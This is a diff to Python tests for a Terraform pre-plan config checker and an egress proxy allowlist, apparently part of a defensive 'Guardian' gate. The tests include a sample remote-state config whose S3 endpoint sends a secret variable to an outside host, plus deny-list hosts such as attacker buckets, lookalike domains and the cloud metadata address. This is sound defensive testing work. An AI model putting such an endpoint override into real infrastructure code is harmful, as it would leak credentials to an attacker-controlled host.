@@ -1,6 +1,7 @@
 """Tests for scripts/check_tf_config.py (static pre-plan gate, Guardian M2)."""
 import importlib.util
 import json
+import sys
 import os
 import tempfile
 import textwrap
@@ -140,6 +141,36 @@ class TfConfigTest(unittest.TestCase):
         self.assertTrue(self.add('terraform {\n cloud {\n organization = "x"\n }\n}\n'))
         self.assertTrue(self.add('terraform {\n provider_meta "aws" {}\n}\n'))
 
+    def test_terraform_remote_state_refused(self):
+        # Guardian HIGH repro: an s3 config endpoint override in a remote-state data source passed.
+        body = """
+        data "terraform_remote_state" "x" {
+          backend = "s3"
+          config = {
+            bucket    = "b"
+            key       = "k"
+            region    = "eu-west-2"
+            endpoints = { s3 = "https://x.example/${var.secret}" }
+          }
+        }
+        """
+        problems = self.add(body)
+        self.assertTrue(any("terraform_remote_state" in p for p in problems), problems)
+        with redirect_stdout(StringIO()), redirect_stderr(StringIO()):
+            self.assertEqual(ctc.main(["--root", self.root, "--tf-dir", "infra", "--profile", "shc"]), 1)
+        # even without overrides, and in a nested module, and in JSON syntax
+        os.remove(os.path.join(self.root, "infra/extra.tf"))
+        self.write("infra/modules/site/rs.tf", 'data "terraform_remote_state" "y" {\n backend = "local"\n}\n')
+        self.assertTrue(any("terraform_remote_state" in p for p in self.check()))
+        os.remove(os.path.join(self.root, "infra/modules/site/rs.tf"))
+        self.write("infra/rs.tf.json", json.dumps({"data": {"terraform_remote_state": {"z": {"backend": "s3"}}}}))
+        self.assertTrue(any("terraform_remote_state" in p for p in self.check()))
+
+    def test_builtin_types(self):
+        self.assertEqual(self.add('resource "terraform_data" "t" {\n input = "x"\n}\n'), [])
+        self.assertTrue(self.add('data "terraform_something" "t" {}\n'))
+        self.assertEqual(self.add('data "aws_caller_identity" "c" {}\n'), [])
+
     def test_nested_local_module_checked(self):
         self.write("infra/modules/site/p.tf", 'provider "aws" {\n endpoints {\n sts = "https://x"\n }\n}\n')
         problems = self.check()
@@ -187,14 +218,107 @@ class EgressProxyRulesTest(unittest.TestCase):
         spec2 = importlib.util.spec_from_file_location("egress_proxy", ROOT / "scripts" / "egress_proxy.py")
         self.ep = importlib.util.module_from_spec(spec2)
         spec2.loader.exec_module(self.ep)
+        spec3 = importlib.util.spec_from_file_location("egress_hosts", ROOT / "scripts" / "egress_hosts.py")
+        self.eh = importlib.util.module_from_spec(spec3)
+        spec3.loader.exec_module(self.eh)
 
-    def test_host_allowlist(self):
-        for h in ("sts.amazonaws.com", "s3.eu-west-2.amazonaws.com", "lambda.eu-west-2.amazonaws.com",
-                  "registry.terraform.io", "releases.hashicorp.com", "STS.AMAZONAWS.COM."):
-            self.assertTrue(self.ep.host_allowed(h), h)
-        for h in ("example.com", "amazonaws.com.evil.example", "evilamazonaws.com", "registry.terraform.io.evil",
-                  "169.254.169.254", "localhost", "x..amazonaws.com", "-x.amazonaws.com"):
-            self.assertFalse(self.ep.host_allowed(h), h)
+    def shc_hosts(self, **kw):
+        args = dict(region="eu-west-2", state_bucket="shc-tfstate-393686273578-euw2",
+                    services=["lambda", "dynamodb", "logs", "ssm", "sns", "events", "monitoring", "apigateway", "email"],
+                    global_hosts=["iam.amazonaws.com", "cloudfront.amazonaws.com", "route53.amazonaws.com",
+                                  "acm.us-east-1.amazonaws.com"],
+                    buckets=["shc-site-393686273578-euw2", "shc-backups-393686273578-euw2"])
+        args.update(kw)
+        return self.eh.build(**args)
+
+    def test_exact_hosts_only(self):
+        allowed = set(self.shc_hosts()) | self.ep.FIXED_HOSTS
+        ok = ("sts.eu-west-2.amazonaws.com", "lambda.eu-west-2.amazonaws.com", "iam.amazonaws.com",
+              "acm.us-east-1.amazonaws.com", "shc-tfstate-393686273578-euw2.s3.eu-west-2.amazonaws.com",
+              "shc-site-393686273578-euw2.s3.amazonaws.com", "registry.terraform.io", "LAMBDA.EU-WEST-2.AMAZONAWS.COM.")
+        for h in ok:
+            self.assertTrue(self.ep.host_allowed(h, allowed), h)
+        bad = ("attacker-bucket.s3.eu-west-2.amazonaws.com", "s3.eu-west-2.amazonaws.com", "s3.amazonaws.com",
+               "abc123.execute-api.eu-west-2.amazonaws.com", "x.elb.amazonaws.com",
+               "my-lb-1.eu-west-2.elb.amazonaws.com", "lambda.us-east-1.amazonaws.com", "sts.amazonaws.com.evil",
+               "example.com", "169.254.169.254", "evil.lambda.eu-west-2.amazonaws.com")
+        for h in bad:
+            self.assertFalse(self.ep.host_allowed(h, allowed), h)
+
+    def test_path_style_is_opt_in(self):
+        self.assertNotIn("s3.eu-west-2.amazonaws.com", self.shc_hosts())
+        self.assertIn("s3.eu-west-2.amazonaws.com", self.shc_hosts(s3_path_style=True))
+
+    def test_build_fails_closed(self):
+        for kw in ({"services": []}, {"services": ["s3"]}, {"services": ["execute-api"]}, {"services": ["elb"]},
+                   {"services": ["s3-control"]}, {"services": ["la mbda"]},
+                   {"global_hosts": ["x.s3.amazonaws.com"]}, {"global_hosts": ["s3.amazonaws.com"]},
+                   {"global_hosts": ["abc.execute-api.us-east-1.amazonaws.com"]},
+                   {"global_hosts": ["example.com"]}, {"global_hosts": ["a.b.c.amazonaws.com"]},
+                   {"buckets": ["dotted.bucket"]}, {"buckets": ["UPPER"]}, {"state_bucket": ""},
+                   {"region": "eu-west"}, {"state_region": "nowhere"}):
+            with self.assertRaises(self.eh.HostError, msg=kw):
+                self.shc_hosts(**kw)
+
+    def test_cli_and_hosts_file(self):
+        with tempfile.TemporaryDirectory() as d:
+            out = os.path.join(d, "hosts.txt")
+            with redirect_stdout(StringIO()), redirect_stderr(StringIO()):
+                self.assertEqual(self.eh.main(["--region", "eu-west-2", "--state-bucket", "b-state",
+                                               "--services", "lambda logs", "--out", out]), 0)
+                self.assertEqual(self.eh.main(["--region", "eu-west-2", "--state-bucket", "b-state",
+                                               "--out", out + "2"]), 1)
+            self.assertFalse(os.path.exists(out + "2"))
+            hosts = self.ep.load_hosts(out)
+            self.assertIn("b-state.s3.eu-west-2.amazonaws.com", hosts)
+            Path(out).write_text("")
+            with self.assertRaises(ValueError):
+                self.ep.load_hosts(out)
+            Path(out).write_text("*.amazonaws.com\n")
+            with self.assertRaises(ValueError):
+                self.ep.load_hosts(out)
+
+    def test_proxy_refuses_busy_port_and_writes_ready_file(self):
+        import socket
+        import subprocess
+        import time
+        with tempfile.TemporaryDirectory() as d:
+            hosts = os.path.join(d, "h")
+            Path(hosts).write_text("sts.eu-west-2.amazonaws.com\n")
+            busy = socket.socket()
+            busy.bind(("127.0.0.1", 0))
+            busy.listen(1)
+            port = busy.getsockname()[1]
+            ready = os.path.join(d, "ready")
+            r = subprocess.run([sys.executable, "-I", str(ROOT / "scripts" / "egress_proxy.py"), "--port", str(port),
+                                "--hosts-file", hosts, "--ready-file", ready], capture_output=True, timeout=20)
+            busy.close()
+            self.assertEqual(r.returncode, 1)
+            self.assertIn(b"cannot bind", r.stderr)
+            self.assertFalse(os.path.exists(ready))
+            # free port: ready file holds the proxy's pid; refuses a foreign CONNECT
+            s2 = socket.socket()
+            s2.bind(("127.0.0.1", 0))
+            port = s2.getsockname()[1]
+            s2.close()
+            proc = subprocess.Popen([sys.executable, "-I", str(ROOT / "scripts" / "egress_proxy.py"), "--port", str(port),
+                                     "--hosts-file", hosts, "--ready-file", ready, "--stats", os.path.join(d, "st")],
+                                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            try:
+                for _ in range(100):
+                    if os.path.exists(ready) and Path(ready).read_text().strip():
+                        break
+                    time.sleep(0.05)
+                self.assertEqual(Path(ready).read_text().strip(), str(proc.pid))
+                c = socket.create_connection(("127.0.0.1", port), timeout=5)
+                c.sendall(b"CONNECT evil.s3.eu-west-2.amazonaws.com:443 HTTP/1.1\r\n\r\n")
+                self.assertIn(b"403", c.recv(100))
+                c.close()
+                time.sleep(0.2)
+                self.assertEqual(json.loads(Path(d, "st").read_text())["refused"], 1)
+            finally:
+                proc.terminate()
+                proc.wait(timeout=5)
 
     def test_connect_parsing_and_addresses(self):
         self.assertEqual(self.ep.parse_connect(b"CONNECT sts.amazonaws.com:443 HTTP/1.1\r\n\r\n"),
